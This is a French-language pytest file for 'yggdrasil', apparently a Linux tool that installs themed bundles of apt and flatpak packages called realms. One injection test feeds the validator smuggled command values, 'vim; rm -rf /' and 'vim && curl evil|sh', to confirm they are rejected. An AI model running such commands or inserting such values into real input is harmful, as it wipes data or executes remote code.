"""Les neuf mondes : données livrées, choix à la carte, actions, voyageurs, royaumes personnels, arbre vivant."""

from types import SimpleNamespace

import pytest

from yggdrasil import arbre, common, realms, ygg
from yggdrasil.common import YggError

NEUF = ["asgard", "midgard", "nidavellir", "muspelheim", "alfheim", "vanaheim", "jotunheim", "niflheim", "helheim"]


def royaume(**kw):
    base = {"name": "t", "title": "Test", "description": "desc"}
    return realms.Realm.from_dict({**base, **kw})


def test_the_nine_worlds_are_shipped_in_order(tmp_path):
    loaded = realms.load_realms(user_directory=tmp_path)
    assert list(loaded) == NEUF
    runes = set()
    for realm in loaded.values():
        assert realm.title and realm.surnom and realm.description and realm.theme
        assert realm.rune and realm.rune_nom and realm.rune_sens
        assert realm.apt or realm.flatpak or any(x.actions for x in realm.logiciels)
        assert realm.choisir(), realm.name
        runes.add(realm.rune)
    assert len(runes) == 9
    # Ce que l'utilisateur a demandé : Bottles reste dans Niflheim, Minecraft dans Muspelheim
    assert "com.usebottles.bottles" in loaded["niflheim"].flatpak
    assert "org.prismlauncher.PrismLauncher" in loaded["muspelheim"].flatpak
    assert "architecture-i386" in loaded["muspelheim"].actions
    assert {"cle-ssh", "identite-git"} <= set(loaded["nidavellir"].actions)
    assert "docker" in loaded["jotunheim"].groups


def test_every_traveller_leads_somewhere(tmp_path):
    loaded = realms.load_realms(user_directory=tmp_path)
    voyageurs = realms.load_voyageurs()
    assert [v.id for v in voyageurs] == ["joueur", "createur", "developpeur", "gardien"]
    for v in voyageurs:
        assert realms.royaumes_pour([v.id], loaded), v.id
    assert realms.royaumes_pour(["joueur"], loaded) == ["midgard", "muspelheim"]
    known = {v.id for v in voyageurs}
    assert all(set(r.voyageurs) <= known for r in loaded.values())


def test_realm_validation_rejects_injection():
    with pytest.raises(YggError):
        royaume(apt=["vim; rm -rf /"])
    with pytest.raises(YggError):
        royaume(logiciels=[{"id": "x", "nom": "X", "apt": ["vim && curl evil|sh"]}])
    with pytest.raises(YggError, match="action inconnue"):
        royaume(logiciels=[{"id": "x", "nom": "X", "actions": ["rm-rf"]}])
    with pytest.raises(YggError, match="aucun logiciel"):
        royaume()
    with pytest.raises(YggError, match="en double"):
        royaume(logiciels=[{"id": "x", "nom": "X", "apt": ["vim"]}, {"id": "x", "nom": "Y", "apt": ["git"]}])


def test_a_la_carte():
    r = royaume(logiciels=[
        {"id": "a", "nom": "A", "apt": ["vim"]},
        {"id": "b", "nom": "B", "flatpak": ["org.example.B"]},
        {"id": "c", "nom": "C", "apt": ["git"], "defaut": False},
    ])
    ids = lambda choix: [x.id for x in choix]  # noqa: E731
    assert ids(r.choisir()) == ["a", "b"]
    assert ids(r.choisir(avec={"c"})) == ["a", "b", "c"]
    assert ids(r.choisir(sans={"a"})) == ["b"]
    assert ids(r.choisir(seulement={"c"})) == ["c"]
    with pytest.raises(YggError, match="pas de logiciel"):
        r.choisir(sans={"zz"})
    assert r.apt == ["vim", "git"] and r.flatpak == ["org.example.B"]


def test_old_flat_format_still_loads():
    r = royaume(apt=["vim"], flatpak=["org.example.App"], groups=["docker"])
    assert [x.id for x in r.logiciels] == ["base"] and r.groups == ["docker"]


def test_parse_dpkg_status():
    out = "vim\tii \ngit\trc \ncurl:amd64\tii \n"
    assert realms.parse_dpkg_status(out) == {"vim", "curl"}


def test_realm_status_and_plan(fake_runner, monkeypatch):
    monkeypatch.setattr(realms.common, "which", lambda cmd: "/usr/bin/" + cmd)
    r = royaume(logiciels=[
        {"id": "outils", "nom": "Outils", "apt": ["git", "vim"], "groups": ["docker"]},
        {"id": "app", "nom": "App", "flatpak": ["org.example.App"]},
        {"id": "forge", "nom": "Forge", "apt": ["git"], "actions": ["cle-ssh"]},
    ])
    runner = fake_runner({
        "dpkg-query": (0, "git\tii \nvim\tun \n"),
        "flatpak list": (0, "org.other.App\n"),
    })
    status = realms.realm_status(r, runner)
    assert status.missing_apt == ["vim"]
    assert status.missing_flatpak == ["org.example.App"]
    assert status.installes == {"forge"}
    assert status.partial and not status.installed and status.label == "partiel"
    lines = realms.plan_lines(status, "alice")
    assert any("vim" in line for line in lines)
    assert any("alice" in line and "docker" in line for line in lines)
    assert any("clé SSH" in line for line in lines)


def test_add_realm_runs_expected_commands(fake_runner, monkeypatch):
    monkeypatch.setattr(realms.common, "which", lambda cmd: "/usr/bin/" + cmd)
    monkeypatch.setattr(realms.common, "target_user", lambda: "alice")
    monkeypatch.setattr(realms, "load_state", lambda: {})
    lances = []
    monkeypatch.setitem(realms.ACTIONS, "cle-ssh", ("une clé", lambda runner, yes: lances.append(yes)))
    r = royaume(logiciels=[
        {"id": "vim", "nom": "Vim", "apt": ["vim"], "groups": ["docker"], "services": ["docker"]},
        {"id": "jeu", "nom": "Jeu", "flatpak": ["org.example.Jeu"], "defaut": False},
        {"id": "cle", "nom": "Clé", "actions": ["cle-ssh"]},
    ])
    runner = fake_runner({"dpkg-query": (0, ""), "getent group docker": (0, "docker:x:999:")})
    assert realms.add_realm(r, runner, assume_yes=True)
    runs = [c[1] for c in runner.calls if c[0] == "run"]
    assert "apt-get install -y vim" in runs
    assert not any("org.example.Jeu" in x for x in runs)  # en option : pas installé
    assert "usermod -aG docker alice" in runs
    assert "systemctl enable --now docker" in runs
    assert lances == [True]
    state = [c for c in runner.calls if c[0] == "write"][0]
    assert '"vim"' in state[2] and '"cle"' in state[2]


def test_actions_run_as_the_user_when_root(fake_runner, monkeypatch):
    monkeypatch.setattr(realms.common, "is_root", lambda: True)
    monkeypatch.setattr(realms.common, "target_user", lambda: "alice")
    assert realms.en_utilisateur(["git", "config", "--global", "user.name"]) == (
        ["runuser", "-u", "alice", "--", "git", "config", "--global", "user.name"], True)
    runner = fake_runner({"dpkg --print-foreign-architectures": (0, "\n")})
    realms.action_i386(runner, True)
    runs = [c[1] for c in runner.calls if c[0] == "run"]
    assert runs[0] == "dpkg --add-architecture i386"
    assert runs[-1] == "apt-get install -y libgl1-mesa-dri:i386 mesa-vulkan-drivers:i386"
    runner = fake_runner({"dpkg --print-foreign-architectures": (0, "i386\n")})
    realms.action_i386(runner, True)
    assert [c[1] for c in runner.calls if c[0] == "run"] == [
        "apt-get install -y libgl1-mesa-dri:i386 mesa-vulkan-drivers:i386"]


def test_remove_realm_refuses_without_state(fake_runner, monkeypatch):
    monkeypatch.setattr(realms, "load_state", lambda: {})
    runner = fake_runner()
    assert realms.remove_realm(royaume(apt=["vim"]), runner, assume_yes=True) is False
    assert not [c for c in runner.calls if c[0] == "run"]


def test_names_without_accents():
    loaded = realms.load_realms()
    assert realms.get_realm("Jötunheim", loaded).name == "jotunheim"
    assert realms.get_realm("ÁSGARD", loaded).name == "asgard"
    with pytest.raises(YggError, match="inconnu"):
        realms.get_realm("valhalla", loaded)


def test_personal_realms_roundtrip(tmp_path):
    r = realms.royaume_depuis("atelier", "Mon atelier", ["gimp", "steam:i386"],
                              [("org.kde.krita", "Krita"), ("com.example.gimp", "Gimp Flatpak")])
    assert [x.id for x in r.logiciels] == ["gimp", "steam-i386", "krita", "gimp-2"]
    texte = realms.to_toml(r)
    perso = tmp_path / "perso"
    perso.mkdir()
    (perso / "atelier.toml").write_text(texte, encoding="utf-8")
    loaded = realms.load_realms(user_directory=perso)
    assert list(loaded)[-1] == "atelier" and loaded["atelier"].perso
    assert loaded["atelier"].flatpak == ["org.kde.krita", "com.example.gimp"]
    # Un royaume livré exporté puis relu est identique
    asgard = loaded["asgard"]
    relu = realms.Realm.from_dict(common.tomllib.loads(realms.to_toml(asgard)))
    assert [(x.id, x.apt, x.flatpak, x.defaut) for x in relu.logiciels] == \
           [(x.id, x.apt, x.flatpak, x.defaut) for x in asgard.logiciels]
    assert relu.rune == asgard.rune and relu.actions == asgard.actions
    # Un royaume personnel ne remplace jamais un royaume livré
    (perso / "midgard.toml").write_text(realms.to_toml(royaume(name="midgard", apt=["vim"])), encoding="utf-8")
    assert not realms.load_realms(user_directory=perso)["midgard"].perso


def test_cli_a_la_carte_and_import(tmp_path, fake_runner, monkeypatch, capsys):
    parser = ygg.build_parser()
    args = parser.parse_args(["realm", "add", "muspelheim", "nidavellir", "--sans", "heroic,muspelheim.lutris",
                              "--avec", "android", "-y"])
    loaded = realms.load_realms()
    mus = [x.id for x in ygg._choix_pour(loaded["muspelheim"], args)]
    assert "heroic" not in mus and "lutris" not in mus and "steam" in mus
    nid = [x.id for x in ygg._choix_pour(loaded["nidavellir"], args)]
    assert "android" in nid
    assert ygg._choix_pour(loaded["asgard"], parser.parse_args(["realm", "add", "asgard"])) is None
    fichier = tmp_path / "jeux.toml"
    fichier.write_text(realms.to_toml(royaume(name="jeux", title="Jeux", apt=["supertux"])), encoding="utf-8")
    args = parser.parse_args(["royaume", "importer", str(fichier), "-y"])
    assert args.func(args, fake_runner(), {}) == 0
    assert (realms.user_realms_dir() / "jeux.toml").exists()
    pris = tmp_path / "pris.toml"
    pris.write_text(realms.to_toml(royaume(name="asgard", title="Faux", apt=["vim"])), encoding="utf-8")
    with pytest.raises(YggError, match="royaume d'Yggdrasil"):
        args = parser.parse_args(["realm", "importer", str(pris), "-y"])
        args.func(args, fake_runner(), {})


def test_living_tree():
    modele = ('<path id="v-lumiere-asgard" d="M0 0" opacity="0"/><path id="v-lumiere-midgard" opacity="0"/>'
              '<text id="v-rune-asgard" x="1" opacity="0">ᛉ</text>')
    svg = arbre.allumer(modele, ["asgard"])
    assert 'id="v-lumiere-asgard" d="M0 0" opacity="1"' in svg
    assert 'id="v-rune-asgard" x="1" opacity="1"' in svg
    assert 'id="v-lumiere-midgard" opacity="0"' in svg


def test_living_tree_counts_installed_realms(fake_runner, monkeypatch):
    monkeypatch.setattr(realms, "load_state", lambda: {"muspelheim": {}})
    monkeypatch.setattr(realms.common, "which", lambda cmd: "/usr/bin/" + cmd)
    loaded = realms.load_realms()
    # Helheim : tous ses paquets sont déjà là ; Muspelheim a été installé par « ygg realm add »
    sortie = "".join(f"{p}\tii \n" for p in loaded["helheim"].apt)
    runner = fake_runner({"dpkg-query": (0, sortie), "flatpak list": (0, "")})
    assert arbre.royaumes_allumes(runner, loaded) == ["muspelheim", "helheim"]


def test_living_tree_can_be_switched_off(fake_runner, monkeypatch, capsys):
    monkeypatch.setattr(arbre, "royaumes_allumes", lambda runner, tous=None: ["asgard"])
    args = SimpleNamespace(etat="non")
    assert arbre.cmd_arbre(args, fake_runner(), {}) == 0
    assert common.load_config()["arbre"]["vivant"] is False
    assert arbre.rafraichir(fake_runner(), common.load_config()) is None
